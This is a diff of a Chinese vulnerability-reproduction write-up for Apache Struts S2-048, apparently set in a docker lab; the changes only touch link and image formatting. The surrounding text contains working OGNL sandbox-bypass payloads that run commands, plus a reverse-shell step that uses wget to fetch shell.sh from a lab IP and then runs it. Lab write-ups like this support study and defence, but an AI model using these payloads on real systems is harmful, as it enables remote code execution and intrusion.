@@ -4,9 +4,9 @@
 
 漏洞详情:
 
-- http://struts.apache.org/docs/s2-048.html
-- http://bobao.360.cn/learning/detail/4078.html
-- [http://xxlegend.com/2017/07/08/S2-048%20%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/](http://xxlegend.com/2017/07/08/S2-048 动态分析/)
+* http://struts.apache.org/docs/s2-048.html
+* http://bobao.360.cn/learning/detail/4078.html
+* \[http://xxlegend.com/2017/07/08/S2-048%20%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/]\(http://xxlegend.com/2017/07/08/S2-048 动态分析/)
 
 ## 漏洞影响
 
@@ -27,13 +27,13 @@ docker-compose up -d
 
 访问 Integration/Struts 1 Integration：
 
-![image-20220302112924516](images/202203021129614.png)
+![image-20220302112924516](../.gitbook/assets/202203021129614.png)
 
 触发 OGNL 表达式的位置是 `Gangster Name` 这个表单。
 
 输入 `${233*233}` 即可查看执行结果（剩下两个表单随意填写）：
 
-![image-20220302113012978](images/202203021130080.png)
+![image-20220302113012978](../.gitbook/assets/202203021130080.png)
 
 借用 S2-045 的沙盒绕过方法改了一个 POC。将如下 POC 填入表单 `Gengster Name` 中，提交即可直接回显命令执行的结果：
 
@@ -41,7 +41,7 @@ docker-compose up -d
 %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}
 ```
 
-![image-20220302113039046](images/202203021130143.png)
+![image-20220302113039046](../.gitbook/assets/202203021130143.png)
 
 当然，也可以直接用 s2-045 的 POC（需要在 Burp 下进行测试）：
 
@@ -49,7 +49,7 @@ docker-compose up -d
 %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
 ```
 
-![image-20220302113241603](images/202203021132734.png)
+![image-20220302113241603](../.gitbook/assets/202203021132734.png)
 
 ### 反弹 shell
 
@@ -74,7 +74,7 @@ wget 192.168.174.128/shell.sh
 %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget 192.168.174.128/shell.sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
 ```
 
-![image-20220302113326283](images/202203021133401.png)
+![image-20220302113326283](../.gitbook/assets/202203021133401.png)
 
 执行 shell.sh 文件的命令为：
 
@@ -90,4 +90,4 @@ bash shell.sh
 
 成功接收反弹 shell：
 
-![image-20220302113402853](images/202203021134938.png)
+![image-20220302113402853](../.gitbook/assets/202203021134938.png)
